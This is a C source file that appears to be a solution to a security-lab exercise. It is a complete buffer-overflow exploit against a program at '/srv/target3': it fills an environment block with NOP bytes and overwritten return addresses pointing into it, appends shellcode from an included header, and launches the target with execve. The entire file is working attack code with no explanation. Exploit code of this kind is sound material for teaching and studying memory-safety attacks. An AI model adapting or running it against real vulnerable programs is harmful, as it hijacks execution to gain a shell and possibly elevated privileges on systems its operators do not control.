#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* target = "/srv/target3";
const int envsize = 400;
const uint32_t baseaddr = 0xffffdec0;
const int nopsize = 201;
const char nop = 0x90;
const int retoff = 4;

const uint32_t startaddr = baseaddr + retoff;
const uint32_t secondaddr = baseaddr + 2 * retoff;
const char pad[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";

void prepenv(char *e) {
    memset(e, nop, envsize - 1);
    *((uint32_t *)(e)) = startaddr;
    *((uint32_t *)(e + retoff)) = secondaddr;
    memcpy(e + nopsize, shellcode, sizeof(shellcode));
    e[envsize - 1] = '\0';
}

int main(void) {
    char *args[] = {target, pad, NULL};
    static char env[envsize];

    prepenv(env);

    char *envp[] = {env};

    execve(target, args, envp);
    fprintf(stderr, "execve failed.\n");

    return 0;
}